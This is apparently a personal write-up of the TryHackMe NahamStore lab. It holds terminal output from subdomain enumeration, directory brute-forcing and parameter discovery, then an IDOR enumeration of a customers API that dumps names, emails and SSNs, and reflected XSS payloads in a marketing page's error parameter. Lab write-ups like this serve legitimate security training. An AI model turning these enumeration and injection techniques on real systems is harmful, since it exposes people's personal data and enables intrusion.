[http-missing-security-headers:access-control-expose-headers] [http] [info] http://nahamstore.thm
[http-missing-security-headers:access-control-allow-headers] [http] [info] http://nahamstore.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://nahamstore.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://nahamstore.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://nahamstore.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://nahamstore.thm
[openssh-detect] [network] [info] marketing.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] shop.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] stock.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] nahamstore-2020.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[openssh-detect] [network] [info] www.nahamstore.thm:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3]
[host-header-injection] [http] [info] http://nahamstore-2020.nahamstore.thm
[host-header-injection] [http] [info] http://marketing.nahamstore.thm
[host-header-injection] [http] [info] http://stock.nahamstore.thm
[host-header-injection] [http] [info] http://nahamstore.thm
[host-header-injection] [http] [info] http://shop.nahamstore.thm
[host-header-injection] [http] [info] http://www.nahamstore.thm
[CVE-2021-31250] [http] [medium] http://nahamstore.thm/if.cgi?B_apply=APPLY&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%282NHtrpBz8oCFdhpzf9K5lVG8H6t%29%3C%2Fscript%3E&failure=fail.htm&max_tcp=3&radio_ping_block=0&redirect=setting.htm&type=ap_tcps_apply
[waf-detect:shadowd] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:apachegeneric] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://nahamstore-2020.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://shop.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://stock.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://www.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://marketing.nahamstore.thm/
[waf-detect:nginxgeneric] [http] [info] http://nahamstore.thm/
[robots-txt-endpoint] [http] [info] http://nahamstore.thm/robots.txt

doing some permutations

──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ altdns -i subdomains.txt -o permutation_output -w words.txt -r -s resolved_output.txt

[*] Completed in 0:00:19

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat words.txt  
dev
test
api

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ more permutation_output 
dev-shop.nahamstore.thm.
www.nahamstoretest.thm.
shop.nahamstoreapi.thm.

removing . at the end

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat permutation_output | cut -d '.' -f 1-3 | tee -a permutation_output_final
dev-shop.nahamstore.thm
www.nahamstoretest.thm
shop.nahamstoreapi.thm
www.devnahamstore.thm
test-nahamstore-2020.nahamstore.thm
marketing.nahamstore-test.thm
nahamstore-2020.testnahamstore.thm
devshop.nahamstore.thm
apimarketing.nahamstore.thm
test-stock.nahamstore.thm
stock.nahamstore.test
stock.nahamstore.api
marketing-api.nahamstore.thm
nahamstore-2020-api.nahamstore.thm
nahamstore-2020.api.nahamstore
marketing.nahamstoretest.thm
stocktest.nahamstore.thm
nahamstore-2020.dev.nahamstore
nahamstore-2020-dev.nahamstore.thm
shop.nahamstore.dev
stock.nahamstore-test.thm
api-shop.nahamstore.thm
api-nahamstore.thm.
dev.stock.nahamstore
stock-api.nahamstore.thm
www.nahamstore.test
nahamstore-2020dev.nahamstore.thm
www.dev.nahamstore
testmarketing.nahamstore.thm
nahamstoretest.thm.
shop.apinahamstore.thm
www.testnahamstore.thm
www.api-nahamstore.thm
shop.dev-nahamstore.thm
apistock.nahamstore.thm
stockdev.nahamstore.thm
nahamstore-2020.test.nahamstore
api.stock.nahamstore
nahamstore.api.thm
wwwapi.nahamstore.thm
nahamstore-2020.nahamstore.test
devnahamstore-2020.nahamstore.thm
marketing.devnahamstore.thm
dev.marketing.nahamstore
shop.api-nahamstore.thm
devmarketing.nahamstore.thm
stock.api-nahamstore.thm
test-nahamstore.thm.
nahamstore-2020.nahamstore.api
test.nahamstore-2020.nahamstore
api-marketing.nahamstore.thm
stock-dev.nahamstore.thm
shop.nahamstoredev.thm
nahamstoreapi.thm.
nahamstore-2020.nahamstoreapi.thm
shop-dev.nahamstore.thm
shop.api.nahamstore
marketing.test.nahamstore
shopdev.nahamstore.thm
nahamstoredev.thm.
www.nahamstore.api
stock.nahamstoreapi.thm
nahamstore-2020.dev-nahamstore.thm
test.stock.nahamstore
shop.nahamstore-dev.thm
apishop.nahamstore.thm
nahamstore-2020api.nahamstore.thm
dev.nahamstore.thm
apinahamstore-2020.nahamstore.thm
shop.nahamstoretest.thm
shop.devnahamstore.thm
stock.dev-nahamstore.thm
stock.nahamstoredev.thm
testnahamstore.thm.
shop.nahamstore.test
stock.test-nahamstore.thm
shop.test-nahamstore.thm
wwwtest.nahamstore.thm
dev-nahamstore-2020.nahamstore.thm
shop-api.nahamstore.thm
nahamstore-2020.api-nahamstore.thm
www.nahamstore-test.thm
marketing.nahamstore.dev
wwwdev.nahamstore.thm
apinahamstore.thm.
dev.www.nahamstore
marketingdev.nahamstore.thm
nahamstore-2020test.nahamstore.thm
stock.nahamstore.dev
stockapi.nahamstore.thm
www-test.nahamstore.thm
test.shop.nahamstore
api.marketing.nahamstore
test.nahamstore.thm
shop.nahamstore-test.thm
nahamstore-2020.nahamstore-dev.thm
www-dev.nahamstore.thm
nahamstore-2020.test-nahamstore.thm
nahamstore-test.thm.
stock.devnahamstore.thm
dev.nahamstore-2020.nahamstore
shop.dev.nahamstore
stock.nahamstore-dev.thm
marketing.nahamstoreapi.thm
nahamstore.test.thm
dev-marketing.nahamstore.thm
api-nahamstore-2020.nahamstore.thm
stock.apinahamstore.thm
shop-test.nahamstore.thm
api.nahamstore-2020.nahamstore
api.www.nahamstore
nahamstore-2020.devnahamstore.thm
stock.nahamstore-api.thm
www.dev-nahamstore.thm
www.nahamstore-dev.thm
api-www.nahamstore.thm
marketing.nahamstore-dev.thm
marketing-test.nahamstore.thm
marketing.dev-nahamstore.thm
devstock.nahamstore.thm
nahamstore.dev.thm
stock.testnahamstore.thm
marketing.nahamstore-api.thm
nahamstore-2020.nahamstoretest.thm
shop.nahamstore-api.thm
www.nahamstoredev.thm
apiwww.nahamstore.thm
testnahamstore-2020.nahamstore.thm
marketing.test-nahamstore.thm
stock.nahamstoretest.thm
testwww.nahamstore.thm
marketingtest.nahamstore.thm
www.apinahamstore.thm
test.www.nahamstore
shop.testnahamstore.thm
nahamstore-2020.nahamstoredev.thm
test-marketing.nahamstore.thm
nahamstore-dev.thm.
api.shop.nahamstore
marketing.api-nahamstore.thm
devwww.nahamstore.thm
stock.test.nahamstore
dev-stock.nahamstore.thm
nahamstore-2020-test.nahamstore.thm
marketing.nahamstore.test
marketing.apinahamstore.thm
marketing.nahamstoredev.thm
stock.dev.nahamstore
nahamstore-2020.apinahamstore.thm
devnahamstore.thm.
shop.nahamstore.api
marketing-dev.nahamstore.thm
api.nahamstore.thm
nahamstore-2020.nahamstore-api.thm
marketing.api.nahamstore
www.nahamstore-api.thm
stock-test.nahamstore.thm
test-shop.nahamstore.thm
nahamstore-2020.nahamstore-test.thm
test.marketing.nahamstore
testshop.nahamstore.thm
marketingapi.nahamstore.thm
teststock.nahamstore.thm
shoptest.nahamstore.thm
nahamstore-api.thm.
dev-www.nahamstore.thm
nahamstore-2020.nahamstore.dev
www-api.nahamstore.thm
www.api.nahamstore
test-www.nahamstore.thm
www.test.nahamstore
stock.api.nahamstore
dev-nahamstore.thm.
dev.shop.nahamstore
shop.test.nahamstore
www.nahamstore.dev
www.nahamstoreapi.thm
marketing.testnahamstore.thm
marketing.dev.nahamstore
marketing.nahamstore.api
api-stock.nahamstore.thm
www.test-nahamstore.thm
shopapi.nahamstore.thm

first let's add to /etc/hosts if we discover another subdomain

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ tail /etc/hosts

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

#127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.97.54 external.pypi-server.loc
10.10.173.88 cybercrafted.thm admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm
10.10.101.47 wekor.thm site.wekor.thm
10.10.105.35 cmess.thm dev.cmess.thm server.cmess.thm sql.cmess.thm backup.cmess.thm
10.10.41.28 something.nahamstore.thm www.nahamstore.thm nahamstore.thm shop.nahamstore.thm stock.nahamstore.thm marketing.nahamstore.thm nahamstore-2020.nahamstore.thm dev-shop.nahamstore.thm www.nahamstoretest.thm nahamstore-2020-api.nahamstore.thm nahamstore-2020dev.nahamstore.thm api-shop.nahamstore.thm nahamstore-2020-dev.nahamstore.thm

I've added a few permutations 

now test with httpx-toolkit

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat permutation_output_final | httpx-toolkit -sc -title

    __    __  __       _  __
   / /_  / /_/ /_____ | |/ /
  / __ \/ __/ __/ __ \|   /
 / / / / /_/ /_/ /_/ /   |
/_/ /_/\__/\__/ .___/_/|_|
             /_/              v1.1.5

		projectdiscovery.io

Use with caution. You are responsible for your actions.
Developers assume no liability and are not responsible for any misuse or damage.
http://api-shop.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://dev-shop.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://nahamstore-2020-api.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://nahamstore-2020-dev.nahamstore.thm [200] []
http://nahamstore-2020dev.nahamstore.thm [200] [NahamStore - Setup Your Hosts File]
http://www.nahamstoretest.thm [200] [NahamStore - Setup Your Hosts File]

If you're reading this you need to add www.nahamstore.thm and nahamstore.thm to your hosts file pointing to something.nahamstore.thm

the same msg in 5.

Let's check http://nahamstore-2020-dev.nahamstore.thm

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dirsearch -u http://nahamstore-2020-dev.nahamstore.thm -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020-dev.nahamstore.thm/_23-03-20_14-32-11.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_14-32-11.log

Target: http://nahamstore-2020-dev.nahamstore.thm/

[14:32:12] Starting: 
[14:32:17] 302 -    0B  - /api  ->  /api/

Task Completed

let's take a pic :)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat final_subdomain | aquatone         
aquatone v1.7.0 started at 2023-03-20T14:33:53-04:00

Targets    : 1
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://nahamstore-2020-dev.nahamstore.thm/api: 200 OK
http://nahamstore-2020-dev.nahamstore.thm/api: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T14:33:53-04:00
 - Finished at : 2023-03-20T14:33:56-04:00
 - Duration    : 3s

Requests:
 - Successful : 1
 - Failed     : 0

 - 2xx : 1
 - 3xx : 0
 - 4xx : 0
 - 5xx : 0

Screenshots:
 - Successful : 1
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__dev_marketing__42099b4af021e53f.png
http__marketing_dev__42099b4af021e53f.png
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
https__marketing_dev__42099b4af021e53f.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png  

uhmm nothing interesting 

again 

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ dirsearch -u http://nahamstore-2020-dev.nahamstore.thm/api -i200,302 -w /usr/share/wordlists/dirb/common.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/witty/.dirsearch/reports/nahamstore-2020-dev.nahamstore.thm/-api_23-03-20_14-36-48.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-03-20_14-36-48.log

Target: http://nahamstore-2020-dev.nahamstore.thm/api/

[14:36:49] Starting: 
[14:37:02] 302 -    0B  - /api/customers  ->  /api/customers/

Task Completed

I see it

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ echo 'http://nahamstore-2020-dev.nahamstore.thm/api/customers' > final_subdomain
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat final_subdomain | aquatone
aquatone v1.7.0 started at 2023-03-20T14:39:02-04:00

Targets    : 1
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

http://nahamstore-2020-dev.nahamstore.thm/api/customers: 400 Bad Request
http://nahamstore-2020-dev.nahamstore.thm/api/customers: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2023-03-20T14:39:02-04:00
 - Finished at : 2023-03-20T14:39:05-04:00
 - Duration    : 3s

Requests:
 - Successful : 1
 - Failed     : 0

 - 2xx : 0
 - 3xx : 0
 - 4xx : 1
 - 5xx : 0

Screenshots:
 - Successful : 1
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd screenshots                
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ ls
http__dev_marketing__42099b4af021e53f.png
http__marketing_dev__42099b4af021e53f.png
http__marketing_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore-2020-dev_nahamstore_thm__ada91241341ae792.png
http__nahamstore-2020-dev_nahamstore_thm__c6a7e330ca22983c.png
http__nahamstore-2020_nahamstore_thm__da39a3ee5e6b4b0d.png
http__nahamstore_thm__da39a3ee5e6b4b0d.png
http__shop_nahamstore_thm__da39a3ee5e6b4b0d.png
https__marketing_dev__42099b4af021e53f.png
http__stock_nahamstore_thm__da39a3ee5e6b4b0d.png
http__www_nahamstore_thm__da39a3ee5e6b4b0d.png
                                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/screenshots]
└─$ eog http__nahamstore-2020-dev_nahamstore_thm__c6a7e330ca22983c.png

customer_id is required

Using burp

Request

GET /api/customers/?customer_id=1 HTTP/1.1

Response

HTTP/1.1 200 OK

Server: nginx/1.14.0 (Ubuntu)

Date: Mon, 20 Mar 2023 18:43:29 GMT

Content-Type: application/json

Connection: close

Content-Length: 103

{"id":1,"name":"Rita Miles","email":"rita.miles969@gmail.com","tel":"816-719-7115","ssn":"366-24-2649"}

let's use burp intruder to get all users :) (IDOR)

GET /api/customers/?customer_id=§0§ HTTP/1.1

Payload type:numbers

From 0 to 99 and doing 1 step

{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}

We found it Jimmy SSN

{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","ssn":"438-92-2964"}

It seems there are only 3 users
```
Jimmy Jones SSN
_Social Security number_ (_SSN_)
*521-61-6392*
### XSS
We've put quite a few XSS vulnerabilities into the web application. See if you can find them all and answer the questions below.
Answer the questions below
```text
http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c

replace c with whatever

we found http://marketing.nahamstore.thm/?error

or using arjun

https://github.com/s0md3v/Arjun

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ arjun -u http://marketing.nahamstore.thm
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: error, based on: body length
[+] Parameters found: error

http://marketing.nahamstore.thm/?error=Campaign+Not+Found

http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(document.domain)%3C/script%3E

marketing.nahamstore.thm

http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(window.origin)%3C/script%3E

http://marketing.nahamstore.thm

https://medium.com/@sherlock297/install-dalfox-on-kali-linux-fadcfc3a6634

sudo su
go install github.com/hahwul/dalfox/v2@latest

┌──(root㉿kali)-[~/go/bin]
└─# cp /root/go/bin/dalfox /usr/local/bin 

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ dalfox -h
Usage:
  dalfox [flags]
  dalfox [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
